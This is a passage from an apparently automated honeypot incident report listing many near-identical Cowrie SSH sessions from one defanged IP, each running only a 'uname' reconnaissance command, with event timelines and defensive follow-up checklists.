- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a487599acea

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:45` | `cowrie.session.connect` |
| `2026-07-04 15:01:45` | `cowrie.client.version` |
| `2026-07-04 15:01:45` | `cowrie.client.kex` |
| `2026-07-04 15:01:45` | `cowrie.login.success` |
| `2026-07-04 15:01:46` | `cowrie.session.params` |
| `2026-07-04 15:01:46` | `cowrie.command.input` |
| `2026-07-04 15:01:46` | `cowrie.log.closed` |
| `2026-07-04 15:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0618d9806d9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:48` | `cowrie.session.connect` |
| `2026-07-04 15:01:48` | `cowrie.client.version` |
| `2026-07-04 15:01:48` | `cowrie.client.kex` |
| `2026-07-04 15:01:49` | `cowrie.login.success` |
| `2026-07-04 15:01:50` | `cowrie.session.params` |
| `2026-07-04 15:01:50` | `cowrie.command.input` |
| `2026-07-04 15:01:50` | `cowrie.log.closed` |
| `2026-07-04 15:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecc11f282b3c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:52` | `cowrie.session.connect` |
| `2026-07-04 15:01:52` | `cowrie.client.version` |
| `2026-07-04 15:01:52` | `cowrie.client.kex` |
| `2026-07-04 15:01:52` | `cowrie.login.success` |
| `2026-07-04 15:01:53` | `cowrie.session.params` |
| `2026-07-04 15:01:53` | `cowrie.command.input` |
| `2026-07-04 15:01:53` | `cowrie.log.closed` |
| `2026-07-04 15:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fe735e68553

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:55` | `cowrie.session.connect` |
| `2026-07-04 15:01:55` | `cowrie.client.version` |
| `2026-07-04 15:01:55` | `cowrie.client.kex` |
| `2026-07-04 15:01:55` | `cowrie.login.success` |
| `2026-07-04 15:01:56` | `cowrie.session.params` |
| `2026-07-04 15:01:56` | `cowrie.command.input` |
| `2026-07-04 15:01:56` | `cowrie.log.closed` |
| `2026-07-04 15:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2be2ddf4a797

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:01 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:01:58` | `cowrie.session.connect` |
| `2026-07-04 15:01:59` | `cowrie.client.version` |
| `2026-07-04 15:01:59` | `cowrie.client.kex` |
| `2026-07-04 15:01:59` | `cowrie.login.success` |
| `2026-07-04 15:02:00` | `cowrie.session.params` |
| `2026-07-04 15:02:00` | `cowrie.command.input` |
| `2026-07-04 15:02:00` | `cowrie.log.closed` |
| `2026-07-04 15:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c58be544e220

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:02` | `cowrie.session.connect` |
| `2026-07-04 15:02:02` | `cowrie.client.version` |
| `2026-07-04 15:02:02` | `cowrie.client.kex` |
| `2026-07-04 15:02:02` | `cowrie.login.success` |
| `2026-07-04 15:02:03` | `cowrie.session.params` |
| `2026-07-04 15:02:03` | `cowrie.command.input` |
| `2026-07-04 15:02:03` | `cowrie.log.closed` |
| `2026-07-04 15:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb3bfc62a577

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:05` | `cowrie.session.connect` |
| `2026-07-04 15:02:05` | `cowrie.client.version` |
| `2026-07-04 15:02:05` | `cowrie.client.kex` |
| `2026-07-04 15:02:06` | `cowrie.login.success` |
| `2026-07-04 15:02:07` | `cowrie.session.params` |
| `2026-07-04 15:02:07` | `cowrie.command.input` |
| `2026-07-04 15:02:07` | `cowrie.log.closed` |
| `2026-07-04 15:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de5cffbedbc9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:09` | `cowrie.session.connect` |
| `2026-07-04 15:02:09` | `cowrie.client.version` |
| `2026-07-04 15:02:09` | `cowrie.client.kex` |
| `2026-07-04 15:02:09` | `cowrie.login.success` |
| `2026-07-04 15:02:10` | `cowrie.session.params` |
| `2026-07-04 15:02:10` | `cowrie.command.input` |
| `2026-07-04 15:02:10` | `cowrie.log.closed` |
| `2026-07-04 15:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c6860de5ec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:12` | `cowrie.session.connect` |
| `2026-07-04 15:02:12` | `cowrie.client.version` |
| `2026-07-04 15:02:12` | `cowrie.client.kex` |
| `2026-07-04 15:02:13` | `cowrie.login.success` |
| `2026-07-04 15:02:13` | `cowrie.session.params` |
| `2026-07-04 15:02:13` | `cowrie.command.input` |
| `2026-07-04 15:02:14` | `cowrie.log.closed` |
| `2026-07-04 15:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d24d04d27a33

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:16` | `cowrie.session.connect` |
| `2026-07-04 15:02:16` | `cowrie.client.version` |
| `2026-07-04 15:02:16` | `cowrie.client.kex` |
| `2026-07-04 15:02:16` | `cowrie.login.success` |
| `2026-07-04 15:02:17` | `cowrie.session.params` |
| `2026-07-04 15:02:17` | `cowrie.command.input` |
| `2026-07-04 15:02:17` | `cowrie.log.closed` |
| `2026-07-04 15:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b5d7f9682e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:19` | `cowrie.session.connect` |
| `2026-07-04 15:02:19` | `cowrie.client.version` |
| `2026-07-04 15:02:19` | `cowrie.client.kex` |
| `2026-07-04 15:02:19` | `cowrie.login.success` |
| `2026-07-04 15:02:20` | `cowrie.session.params` |
| `2026-07-04 15:02:20` | `cowrie.command.input` |
| `2026-07-04 15:02:20` | `cowrie.log.closed` |
| `2026-07-04 15:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-845c224fc941

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:22` | `cowrie.session.connect` |
| `2026-07-04 15:02:22` | `cowrie.client.version` |
| `2026-07-04 15:02:22` | `cowrie.client.kex` |
| `2026-07-04 15:02:23` | `cowrie.login.success` |
| `2026-07-04 15:02:24` | `cowrie.session.params` |
| `2026-07-04 15:02:24` | `cowrie.command.input` |
| `2026-07-04 15:02:24` | `cowrie.log.closed` |
| `2026-07-04 15:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e4bb5178056

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:26` | `cowrie.session.connect` |
| `2026-07-04 15:02:26` | `cowrie.client.version` |
| `2026-07-04 15:02:26` | `cowrie.client.kex` |
| `2026-07-04 15:02:26` | `cowrie.login.success` |
| `2026-07-04 15:02:27` | `cowrie.session.params` |
| `2026-07-04 15:02:27` | `cowrie.command.input` |
| `2026-07-04 15:02:27` | `cowrie.log.closed` |
| `2026-07-04 15:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b93ca8e652e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:29` | `cowrie.session.connect` |
| `2026-07-04 15:02:29` | `cowrie.client.version` |
| `2026-07-04 15:02:29` | `cowrie.client.kex` |
| `2026-07-04 15:02:29` | `cowrie.login.success` |
| `2026-07-04 15:02:30` | `cowrie.session.params` |
| `2026-07-04 15:02:30` | `cowrie.command.input` |
| `2026-07-04 15:02:30` | `cowrie.log.closed` |
| `2026-07-04 15:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72725201bfbc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:32` | `cowrie.session.connect` |
| `2026-07-04 15:02:32` | `cowrie.client.version` |
| `2026-07-04 15:02:32` | `cowrie.client.kex` |
| `2026-07-04 15:02:33` | `cowrie.login.success` |
| `2026-07-04 15:02:34` | `cowrie.session.params` |
| `2026-07-04 15:02:34` | `cowrie.command.input` |
| `2026-07-04 15:02:34` | `cowrie.log.closed` |
| `2026-07-04 15:02:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6328426acf20

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:36` | `cowrie.session.connect` |
| `2026-07-04 15:02:36` | `cowrie.client.version` |
| `2026-07-04 15:02:36` | `cowrie.client.kex` |
| `2026-07-04 15:02:36` | `cowrie.login.success` |
| `2026-07-04 15:02:37` | `cowrie.session.params` |
| `2026-07-04 15:02:37` | `cowrie.command.input` |
| `2026-07-04 15:02:37` | `cowrie.log.closed` |
| `2026-07-04 15:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58480915deac

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:39` | `cowrie.session.connect` |
| `2026-07-04 15:02:39` | `cowrie.client.version` |
| `2026-07-04 15:02:39` | `cowrie.client.kex` |
| `2026-07-04 15:02:40` | `cowrie.login.success` |
| `2026-07-04 15:02:40` | `cowrie.session.params` |
| `2026-07-04 15:02:40` | `cowrie.command.input` |
| `2026-07-04 15:02:40` | `cowrie.log.closed` |
| `2026-07-04 15:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641623b01067

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:43` | `cowrie.session.connect` |
| `2026-07-04 15:02:43` | `cowrie.client.version` |
| `2026-07-04 15:02:43` | `cowrie.client.kex` |
| `2026-07-04 15:02:43` | `cowrie.login.success` |
| `2026-07-04 15:02:44` | `cowrie.session.params` |
| `2026-07-04 15:02:44` | `cowrie.command.input` |
| `2026-07-04 15:02:44` | `cowrie.log.closed` |
| `2026-07-04 15:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7112cfaf14f8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:46` | `cowrie.session.connect` |
| `2026-07-04 15:02:46` | `cowrie.client.version` |
| `2026-07-04 15:02:46` | `cowrie.client.kex` |
| `2026-07-04 15:02:46` | `cowrie.login.success` |
| `2026-07-04 15:02:47` | `cowrie.session.params` |
| `2026-07-04 15:02:47` | `cowrie.command.input` |
| `2026-07-04 15:02:47` | `cowrie.log.closed` |
| `2026-07-04 15:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-383b17a513c9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:49` | `cowrie.session.connect` |
| `2026-07-04 15:02:49` | `cowrie.client.version` |
| `2026-07-04 15:02:49` | `cowrie.client.kex` |
| `2026-07-04 15:02:50` | `cowrie.login.success` |
| `2026-07-04 15:02:51` | `cowrie.session.params` |
| `2026-07-04 15:02:51` | `cowrie.command.input` |
| `2026-07-04 15:02:51` | `cowrie.log.closed` |
| `2026-07-04 15:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129697ffb469

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:53` | `cowrie.session.connect` |
| `2026-07-04 15:02:53` | `cowrie.client.version` |
| `2026-07-04 15:02:53` | `cowrie.client.kex` |
| `2026-07-04 15:02:53` | `cowrie.login.success` |
| `2026-07-04 15:02:54` | `cowrie.session.params` |
| `2026-07-04 15:02:54` | `cowrie.command.input` |
| `2026-07-04 15:02:54` | `cowrie.log.closed` |
| `2026-07-04 15:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e129b960b303

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:56` | `cowrie.session.connect` |
| `2026-07-04 15:02:56` | `cowrie.client.version` |
| `2026-07-04 15:02:56` | `cowrie.client.kex` |
| `2026-07-04 15:02:56` | `cowrie.login.success` |
| `2026-07-04 15:02:57` | `cowrie.session.params` |
| `2026-07-04 15:02:57` | `cowrie.command.input` |
| `2026-07-04 15:02:57` | `cowrie.log.closed` |
| `2026-07-04 15:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4beab9265889

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:02 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:02:59` | `cowrie.session.connect` |
| `2026-07-04 15:02:59` | `cowrie.client.version` |
| `2026-07-04 15:03:00` | `cowrie.client.kex` |
| `2026-07-04 15:03:00` | `cowrie.login.success` |
| `2026-07-04 15:03:01` | `cowrie.session.params` |
| `2026-07-04 15:03:01` | `cowrie.command.input` |
| `2026-07-04 15:03:01` | `cowrie.log.closed` |
| `2026-07-04 15:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbd786c9d73f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:03` | `cowrie.session.connect` |
| `2026-07-04 15:03:03` | `cowrie.client.version` |
| `2026-07-04 15:03:03` | `cowrie.client.kex` |
| `2026-07-04 15:03:03` | `cowrie.login.success` |
| `2026-07-04 15:03:04` | `cowrie.session.params` |
| `2026-07-04 15:03:04` | `cowrie.command.input` |
| `2026-07-04 15:03:04` | `cowrie.log.closed` |
| `2026-07-04 15:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bef37429e5f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:06` | `cowrie.session.connect` |
| `2026-07-04 15:03:06` | `cowrie.client.version` |
| `2026-07-04 15:03:06` | `cowrie.client.kex` |
| `2026-07-04 15:03:07` | `cowrie.login.success` |
| `2026-07-04 15:03:07` | `cowrie.session.params` |
| `2026-07-04 15:03:07` | `cowrie.command.input` |
| `2026-07-04 15:03:07` | `cowrie.log.closed` |
| `2026-07-04 15:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e862b18b67ba

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:10` | `cowrie.session.connect` |
| `2026-07-04 15:03:10` | `cowrie.client.version` |
| `2026-07-04 15:03:10` | `cowrie.client.kex` |
| `2026-07-04 15:03:10` | `cowrie.login.success` |
| `2026-07-04 15:03:11` | `cowrie.session.params` |
